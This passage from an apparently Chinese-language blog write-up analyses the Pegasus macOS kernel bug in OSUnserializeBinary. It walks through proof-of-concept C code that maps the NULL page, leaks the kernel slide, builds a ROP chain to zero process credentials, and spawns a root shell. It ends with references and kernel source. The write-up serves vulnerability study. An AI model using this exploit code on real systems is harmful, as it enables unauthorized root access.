class="number">0x00000000</span>));</div><div class="line">    WRITE_IN(dict, (<span class="number">0x00000000</span>));</div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeSymbol | <span class="number">4</span>));   <span class="comment">// symbol 'CCC'</span></div><div class="line">    WRITE_IN(dict, (<span class="number">0x00434343</span>));</div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeObject | <span class="number">1</span>));   <span class="comment">// ref to object 1 (OSString)</span></div><div class="line"></div><div class="line">    <span class="comment">/* map the NULL page */</span></div><div class="line"></div><div class="line">    <span class="keyword">mach_vm_address_t</span> null_map = <span class="number">0</span>;</div><div class="line"></div><div class="line">    vm_deallocate(mach_task_self(), <span class="number">0x0</span>, PAGE_SIZE);</div><div class="line"></div><div class="line">    kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, <span class="number">0</span>);</div><div class="line">    <span class="keyword">if</span> (kr != KERN_SUCCESS)</div><div class="line">        <span class="keyword">return</span>;</div><div class="line"></div><div class="line">    <span class="keyword">macho_map_t</span> *<span class="built_in">map</span> = map_file_with_path(KERNEL_PATH_ON_DISK);</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"(i) Leaking kslide...\n"</span>);</div><div class="line"></div><div class="line">    SET_KERNEL_SLIDE(kslide_infoleak()); <span class="comment">// set global kernel slide</span></div><div class="line"></div><div class="line">    <span class="comment">/* set the stack pivot at 0x20 */</span></div><div class="line"></div><div class="line">    *(<span class="keyword">volatile</span> <span class="keyword">uint64_t</span> *)(<span class="number">0x20</span>) = (<span class="keyword">volatile</span> <span class="keyword">uint64_t</span>)ROP_XCHG_ESP_EAX(<span class="built_in">map</span>); <span class="comment">// stack pivot</span></div><div class="line"></div><div class="line">    <span class="comment">/* build ROP chain */</span></div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"(i) Building ROP chain...\n"</span>);</div><div class="line"></div><div class="line">    <span class="keyword">rop_chain_t</span> *chain = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">rop_chain_t</span>));</div><div class="line"></div><div class="line">    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(<span class="built_in">map</span>, <span class="string">"_current_proc"</span>));</div><div class="line"></div><div class="line">    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(<span class="built_in">map</span>, chain);</div><div class="line">    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(<span class="built_in">map</span>, <span class="string">"_proc_ucred"</span>));</div><div class="line"></div><div class="line">    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(<span class="built_in">map</span>, chain);</div><div class="line">    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(<span class="built_in">map</span>, <span class="string">"_posix_cred_get"</span>));</div><div class="line"></div><div class="line">    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(<span class="built_in">map</span>, chain);</div><div class="line">    PUSH_GADGET(chain) = ROP_ARG2(chain, <span class="built_in">map</span>, (<span class="keyword">sizeof</span>(<span class="keyword">int</span>) * <span class="number">3</span>));</div><div class="line">    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(<span class="built_in">map</span>, <span class="string">"_bzero"</span>));</div><div class="line"></div><div class="line">    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(<span class="built_in">map</span>, <span class="string">"_thread_exception_return"</span>));</div><div class="line"></div><div class="line">    <span class="comment">/* chain transfer, will redirect execution flow from 0x0 to our main chain above */</span></div><div class="line"></div><div class="line">    <span class="keyword">uint64_t</span> *transfer = (<span class="keyword">uint64_t</span> *)<span class="number">0x0</span>;</div><div class="line">    transfer[<span class="number">0</span>] = ROP_POP_RSP(<span class="built_in">map</span>);</div><div class="line">    transfer[<span class="number">1</span>] = (<span class="keyword">uint64_t</span>)chain-&gt;chain;</div><div class="line"></div><div class="line">    <span class="comment">/* trigger */</span></div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"(+) All done! Triggering the bug!\n"</span>);</div><div class="line"></div><div class="line">    host_get_io_master(mach_host_self(), &amp;master); <span class="comment">// get iokit master port</span></div><div class="line"></div><div class="line">    kr = io_service_get_matching_services_bin(master, (<span class="keyword">char</span> *)dict, idx, &amp;res);</div><div class="line">    <span class="keyword">if</span> (kr != KERN_SUCCESS)</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这里有很多的宏定义函数，先不用管这些，整个PoC代码在文章最后将会在我的GitHub上找到<br>下面一步一步分析</p><h4 id="构造字典-1"><a href="#构造字典-1" class="headerlink" title="构造字典"></a>构造字典</h4><p>将如下构造  </p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;dict&gt;</div><div class="line">    &lt;<span class="type">string</span>&gt;AAA&lt;/<span class="type">string</span>&gt;</div><div class="line">    &lt;boolean&gt;true&lt;/boolean&gt;</div><div class="line"></div><div class="line">    &lt;symbol&gt;BBB&lt;/symbol&gt;</div><div class="line">    &lt;data&gt;</div><div class="line">        <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></div><div class="line">    &lt;/data&gt;</div><div class="line"></div><div class="line">    &lt;symbol&gt;CCC&lt;/symbol&gt;</div><div class="line">    &lt;reference&gt;<span class="number">1</span>&lt;/reference&gt; &lt;!--引用第一个<span class="type">string</span>元素--&gt;</div><div class="line">&lt;/dict&gt;</div></pre></td></tr></table></figure><p>当执行<code>retain</code>时就会以0x20的偏移量地址读取，也就是rip其值将为0x20<br>可能你会疑惑，0x20地址处不是应该处于__PAGEZERO段吗？是这样的，所以下面介绍Map NULL技术</p><h4 id="Map-NULL"><a href="#Map-NULL" class="headerlink" title="Map NULL"></a>Map NULL</h4><p>苹果并没有对32位强制限制不能map，具体我在Google上搜到了这些答案：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/pic/0-1.png?raw=true" alt="0-1"><br>意思就是我们可以将__PAGEZERO段重新映射为可用段，就可以将ROP链布置上去。  </p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mach_vm_address_t null_map = <span class="number">0</span><span class="comment">;</span></div><div class="line"></div><div class="line">vm_deallocate(<span class="name">mach_task_self</span>(), <span class="number">0</span>x0, PAGE_SIZE)<span class="comment">;</span></div><div class="line"></div><div class="line">kr = mach_vm_allocate(<span class="name">mach_task_self</span>(), <span class="symbol">&amp;null_map</span>, PAGE_SIZE, <span class="number">0</span>)<span class="comment">;</span></div><div class="line">if (<span class="name">kr</span> != KERN_SUCCESS)</div><div class="line">    return<span class="comment">;</span></div></pre></td></tr></table></figure><p>这段代码即禁用__PAGEZERO段和Map NULL，要达到目的，我们需要将二进制文件编译为32位，并包含pagezero_size,0标志  </p><h3 id="Pivoting-stack和ROP链"><a href="#Pivoting-stack和ROP链" class="headerlink" title="Pivoting stack和ROP链"></a>Pivoting stack和ROP链</h3><p>下面的这部分内容和我之前分析的linux ROP技术类似，利用ret指令将栈中的地址pop到rip达到执行任意代码的目的。若不清楚，移步<a href="https://null-me.github.io/2017/04/13/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/" target="_blank" rel="external">Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip</a><br>首先将rip转移到0x20处</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*(<span class="keyword">volatile</span> <span class="keyword">uint64_t</span> *)(<span class="number">0x20</span>) = (<span class="keyword">volatile</span> <span class="keyword">uint64_t</span>)ROP_XCHG_ESP_EAX(<span class="built_in">map</span>); <span class="comment">// stack pivot</span></div></pre></td></tr></table></figure><p>然后通过交换rsp和eax值，将rip转移到0x00位置处，这一步的目的即在__PAGEZERO段上控制栈结构，因为每是将rsp的值pop到ret中，这也就是stack pivot技术。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">uint64_t</span> *transfer = (<span class="keyword">uint64_t</span> *)<span class="number">0x0</span>;</div><div class="line">transfer[<span class="number">0</span>] = ROP_POP_RSP(<span class="built_in">map</span>);</div><div class="line">transfer[<span class="number">1</span>] = (<span class="keyword">uint64_t</span>)chain-&gt;chain;</div></pre></td></tr></table></figure><p>接着rip转移到<code>main-&gt;chain</code>，和前面一样ROP链一样，不过主链是为了达到提权的目的。<br>主链的代码  </p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">rop_chain_t *chain = calloc(<span class="number">1</span>, sizeof(<span class="name">rop_chain_t</span>))<span class="comment">;</span></div><div class="line"></div><div class="line">PUSH_GADGET(<span class="name">chain</span>) = SLIDE_POINTER(<span class="name">find_symbol_address</span>(<span class="name">map</span>, <span class="string">"_current_proc"</span>))<span class="comment">;</span></div><div class="line"></div><div class="line">PUSH_GADGET(<span class="name">chain</span>) = ROP_RAX_TO_ARG1(<span class="name">map</span>, chain)<span class="comment">;</span></div><div class="line">PUSH_GADGET(<span class="name">chain</span>) = SLIDE_POINTER(<span class="name">find_symbol_address</span>(<span class="name">map</span>, <span class="string">"_proc_ucred"</span>))<span class="comment">;</span></div><div class="line"></div><div class="line">PUSH_GADGET(<span class="name">chain</span>) = ROP_RAX_TO_ARG1(<span class="name">map</span>, chain)<span class="comment">;</span></div><div class="line">PUSH_GADGET(<span class="name">chain</span>) = SLIDE_POINTER(<span class="name">find_symbol_address</span>(<span class="name">map</span>, <span class="string">"_posix_cred_get"</span>))<span class="comment">;</span></div><div class="line"></div><div class="line">PUSH_GADGET(<span class="name">chain</span>) = ROP_RAX_TO_ARG1(<span class="name">map</span>, chain)<span class="comment">;</span></div><div class="line">PUSH_GADGET(<span class="name">chain</span>) = ROP_ARG2(<span class="name">chain</span>, map, (<span class="name">sizeof</span>(<span class="name">int</span>) * 3));</div><div class="line">PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_bzero"));</div><div class="line"></div><div class="line">PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_thread_exception_return"));</div></pre></td></tr></table></figure><p>主链的执行过程其实原理并不复杂：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">chain prototype:</div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">proc</span> = <span class="title">current_proc</span><span class="params">()</span></span>;<span class="comment">//找到当前程序的credentials结构</span></div><div class="line">ucred = proc_ucred(<span class="function"><span class="keyword">proc</span>)</span>;</div><div class="line">posix_cred = posix_cred_get(ucred);</div><div class="line"></div><div class="line">bzero(posix_cred, (sizeof(int) * <span class="number">3</span>));<span class="comment">//将组id设为0即提权为root</span></div><div class="line">thread_exception_return();<span class="comment">//thread_exception_return只是让我们离开内核区域而不会panic，通常用于从内核陷阱返回。</span></div></pre></td></tr></table></figure><p>接下来的代码和之前一样，测试我们构造的dic是否有效：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">host_get_io_master(<span class="name">mach_host_self</span>(), <span class="symbol">&amp;master</span>)<span class="comment">; // get iokit master port</span></div><div class="line"></div><div class="line">kr = io_service_get_matching_services_bin(<span class="name">master</span>, (<span class="name">char</span> *)dict, idx, &amp;res);</div><div class="line">if (kr != KERN_SUCCESS)</div><div class="line">    return;</div></pre></td></tr></table></figure><p>最后如果一切都顺利，我们检查当前进程<code>getuid</code>是否等于0，如果是就提权root成功，然后调用<code>system(&quot;/bin/bash&quot;)</code>弹出一个shell！</p><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">if</span> (getuid() == <span class="number">0</span>) &#123;</div><div class="line">    <span class="selector-tag">puts</span>(<span class="string">"(+) got r00t!"</span>);</div><div class="line">    <span class="selector-tag">system</span>(<span class="string">"/bin/bash"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>测试：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/pic/0-2.png?raw=true" alt="0-2"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>终于完了，如果认真的一步步分析过来，相信你一定有很多收获和感悟。谁不一样呢？当我一步步的咬着英文看了太多资料和别人的分析，当不熟悉一个领域的时候，会感到害怕，烦躁，困惑。当然在这之中，特别感谢看雪iOS安全小组的<a href="http://turingh.github.io/2016/09/07/CVE-2016-4656%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/" target="_blank" rel="external">黄大大</a>和<a href="http://blog.imjun.net/posts/restore-symbol-of-iOS-app/" target="_blank" rel="external">杨君大大</a>，给我了解答了很多困惑，很是感动。从准备分析到写完这篇文章，连续花了7天时间，庆幸自己坚持下来，学到了很多之前都不了解的技术。在分析这个漏洞及利用的时候，我才发现把之前学的linux堆栈漏洞的各个知识点都串了起来，包括-堆管理原理，ROP，UAF，Vtable等等等等。也印证了今天在微博上看到教主的那句话：<br><strong>学好书不求甚解，爱技术不论用处</strong>，当我去用之前所学去理解一个个知识点的时候才体会到后半句：<strong>每有会意便欣然忘食</strong></p><p><strong>PoC</strong><br>完整的Poc代码在<a href="https://github.com/NULL-ME/PegasusX">这里</a></p><p><strong>特别感谢</strong></p><ul><li><a href="http://turingh.github.io/2016/09/07/CVE-2016-4656%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/" target="_blank" rel="external">mrh</a> –这是黄大大的分析，黄大大是一个特别严谨细致的人，分析文章使人豁然开朗</li><li><a href="https://jndok.github.io/2016/10/04/pegasus-writeup/" target="_blank" rel="external">jndok’s blog</a> –本文大多基于jndok的分析，可以去看看原文的分析</li><li><a href="http://blog.imjun.net/posts/restore-symbol-of-iOS-app/" target="_blank" rel="external">杨君的小黑屋</a>–杨君大大特别有耐心，执着于技术，乐于分享技术</li></ul><p><strong>参考</strong><br>1.<a href="https://developer.apple.com/library/content/samplecode/SimpleUserClient/Listings/User_Client_Info_txt.html" target="_blank" rel="external">User Client Info.txt</a><br>2.<a href="https://www.blackhat.com/docs/eu-15/materials/eu-15-Todesco-Attacking-The-XNU-Kernal-In-El-Capitain.pdf" target="_blank" rel="external">Attacking-The-XNU-Kernal-In-El-Capitain</a><br>3.<a href="https://bazad.github.io/2016/05/mac-os-x-use-after-free/" target="_blank" rel="external">Mac OS X Privilege Escalation via Use-After-Free: CVE-2016-1828</a><br>4.<a href="http://ho.ax/downloads/Defiling-Mac-OS-X-Ruxcon.pdf" target="_blank" rel="external">Defiling-Mac-OS-X-Ruxcon</a><br>5.<a href="https://www.exploit-db.com/exploits/39925/" target="_blank" rel="external">Apple Mac OSX Kernel - Exploitable NULL Dereference in CoreCaptureResponder Due to Unchecked Return Value</a><br>6.<a href="http://www.cnblogs.com/huxiao-tee/p/4660352.html" target="_blank" rel="external">认真分析mmap：是什么 为什么 怎么用</a><br>7.<a href="http://ho.ax/posts/2012/02/resolving-kernel-symbols/" target="_blank" rel="external">Resolving kernel symbols</a>  </p><p><strong>OSUnserializeBinary源码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div></pre></td><td class="code"><pre><div class="line"><span class="function">OSObject *</span></div><div class="line"><span class="title">OSUnserializeBinary</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> bufferSize, OSString **errorString)</span></div><div class="line">&#123;</div><div class="line">OSObject ** objsArray;</div><div class="line"><span class="keyword">uint32_t</span>    objsCapacity;</div><div class="line"><span class="keyword">uint32_t</span>    objsIdx;</div><div class="line"></div><div class="line">OSObject ** stackArray;</div><div class="line"><span class="keyword">uint32_t</span>    stackCapacity;</div><div class="line"><span class="keyword">uint32_t</span>    stackIdx;</div><div class="line"></div><div class="line">    OSObject     * result;</div><div class="line">    OSObject     * parent;</div><div class="line">    OSDictionary * dict;</div><div class="line">    OSArray      * <span class="built_in">array</span>;</div><div class="line">    OSSet        * <span class="built_in">set</span>;</div><div class="line">    OSDictionary * newDict;</div><div class="line">    OSArray      * newArray;</div><div class="line">    OSSet        * newSet;</div><div class="line">    OSObject     * o;</div><div class="line">    OSSymbol     * sym;</div><div class="line"></div><div class="line">    <span class="keyword">size_t</span>           bufferPos;</div><div class="line">    <span class="keyword">const</span> <span class="keyword">uint32_t</span> * next;</div><div class="line">    <span class="keyword">uint32_t</span>         key, len, wordLen;</div><div class="line">    <span class="keyword">bool</span>             end, newCollect, isRef;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> value;</div><div class="line">    <span class="keyword">bool</span> ok;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (errorString) *errorString = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">strcmp</span>(kOSSerializeBinarySignature, buffer)) <span class="keyword">return</span> (<span class="literal">NULL</span>);</div><div class="line"><span class="keyword">if</span> (<span class="number">3</span> &amp; ((<span class="keyword">uintptr_t</span>) buffer)) <span class="keyword">return</span> (<span class="literal">NULL</span>);</div><div class="line"><span class="keyword">if</span> (bufferSize &lt; <span class="keyword">sizeof</span>(kOSSerializeBinarySignature)) <span class="keyword">return</span> (<span class="literal">NULL</span>);</div><div class="line">bufferPos = <span class="keyword">sizeof</span>(kOSSerializeBinarySignature);</div><div class="line">next = (typeof(next)) (((<span class="keyword">uintptr_t</span>) buffer) + bufferPos);</div><div class="line"></div><div class="line">DEBG(<span class="string">"---------OSUnserializeBinary(%p)\n"</span>, buffer);</div><div class="line"></div><div class="line">objsArray = stackArray    = <span class="literal">NULL</span>;</div><div class="line">objsIdx   = objsCapacity  = <span class="number">0</span>;</div><div class="line">stackIdx  = stackCapacity = <span class="number">0</span>;</div><div class="line"></div><div class="line">    result   = <span class="number">0</span>;</div><div class="line">    parent   = <span class="number">0</span>;</div><div class="line">dict     = <span class="number">0</span>;</div><div class="line"><span class="built_in">array</span>    = <span class="number">0</span>;</div><div class="line"><span class="built_in">set</span>      = <span class="number">0</span>;</div><div class="line">sym      = <span class="number">0</span>;</div><div class="line"></div><div class="line">ok = <span class="literal">true</span>;</div><div class="line"><span class="keyword">while</span> (ok)</div><div class="line">&#123;</div><div class="line">bufferPos += <span class="keyword">sizeof</span>(*next);</div><div class="line"><span class="keyword">if</span> (!(ok = (bufferPos &lt;= bufferSize))) <span class="keyword">break</span>;</div><div class="line">key = *next++;</div><div class="line"></div><div class="line">        len = (key &amp; kOSSerializeDataMask);</div><div class="line">        wordLen = (len + <span class="number">3</span>) &gt;&gt; <span class="number">2</span>;</div><div class="line">end = (<span class="number">0</span> != (kOSSerializeEndCollecton &amp; key));</div><div class="line">        DEBG(<span class="string">"key 0x%08x: 0x%04x, %d\n"</span>, key, len, end);</div><div class="line"></div><div class="line">        newCollect = isRef = <span class="literal">false</span>;</div><div class="line">o = <span class="number">0</span>; newDict = <span class="number">0</span>; newArray = <span class="number">0</span>; newSet = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="keyword">switch</span> (kOSSerializeTypeMask &amp; key)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">case</span> kOSSerializeDictionary:</div><div class="line">o = newDict = OSDictionary::withCapacity(len);</div><div class="line">newCollect = (len != <span class="number">0</span>);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> kOSSerializeArray:</div><div class="line">o = newArray = OSArray::withCapacity(len);</div><div class="line">newCollect = (len != <span class="number">0</span>);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> kOSSerializeSet:</div><div class="line">o = newSet = OSSet::withCapacity(len);</div><div class="line">newCollect = (len != <span class="number">0</span>);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line"></div><div class="line">    <span class="keyword">case</span> kOSSerializeObject:</div><div class="line"><span class="keyword">if</span> (len &gt;= objsIdx) <span class="keyword">break</span>;</div><div class="line">o = objsArray[len];</div><div class="line">o-&gt;retain();</div><div class="line">isRef = <span class="literal">true</span>;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line">    <span class="keyword">case</span> kOSSerializeNumber:</div><div class="line">bufferPos += <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>);</div><div class="line"><span class="keyword">if</span> (bufferPos &gt; bufferSize) <span class="keyword">break</span>;</div><div class="line">    value = next[<span class="number">1</span>];</div><div class="line">    value &lt;&lt;= <span class="number">32</span>;</div><div class="line">    value |= next[<span class="number">0</span>];</div><div class="line">    o = OSNumber::withNumber(value, len);</div><div class="line">    next += <span class="number">2</span>;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line"></div><div class="line">    <span class="keyword">case</span> kOSSerializeSymbol:</div><div class="line">bufferPos += (wordLen * <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</div><div class="line"><span class="keyword">if</span> (bufferPos &gt; bufferSize)           <span class="keyword">break</span>;</div><div class="line"><span class="keyword">if</span> (<span class="number">0</span> != ((<span class="keyword">const</span> <span class="keyword">char</span> *)next)[len<span class="number">-1</span>]) <span class="keyword">break</span>;</div><div class="line">        o = (OSObject *) OSSymbol::withCString((<span class="keyword">const</span> <span class="keyword">char</span> *) next);</div><div class="line">        next += wordLen;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line"></div><div class="line">    <span class="keyword">case</span> kOSSerializeString:</div><div class="line">bufferPos += (wordLen * <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</div><div class="line"><span class="keyword">if</span> (bufferPos &gt; bufferSize) <span class="keyword">break</span>;</div><div class="line">        o = OSString::withStringOfLength((<span class="keyword">const</span> <span class="keyword">char</span> *) next, len);</div><div class="line">        next += wordLen;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        <span class="keyword">case</span> kOSSerializeData:</div><div class="line">bufferPos += (wordLen * <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</div><div class="line"><span class="keyword">if</span> (bufferPos &gt; bufferSize) <span class="keyword">break</span>;</div><div class="line">        o = OSData::withBytes(next, len);</div><div class="line">        next += wordLen;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        <span class="keyword">case</span> kOSSerializeBoolean:</div><div class="line">o = (len ? kOSBooleanTrue : kOSBooleanFalse);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line"></div><div class="line">    <span class="keyword">default</span>:</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!(ok = (o != <span class="number">0</span>))) <span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!isRef)</div><div class="line">&#123;</div><div class="line">setAtIndex(objs, objsIdx, o);</div><div class="line"><span class="keyword">if</span> (!ok) <span class="keyword">break</span>;</div><div class="line">objsIdx++;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (dict)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (sym)</div><div class="line">&#123;</div><div class="line">DEBG(<span class="string">"%s = %s\n"</span>, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</div><div class="line"><span class="keyword">if</span> (o != dict) ok = dict-&gt;setObject(sym, o);</div><div class="line">o-&gt;release();</div><div class="line">sym-&gt;release();</div><div class="line">sym = <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> </div><div class="line">&#123;</div><div class="line">sym = OSDynamicCast(OSSymbol, o);</div><div class="line">ok = (sym != <span class="number">0</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">array</span>) </div><div class="line">&#123;</div><div class="line">ok = <span class="built_in">array</span>-&gt;setObject(o);</div><div class="line">    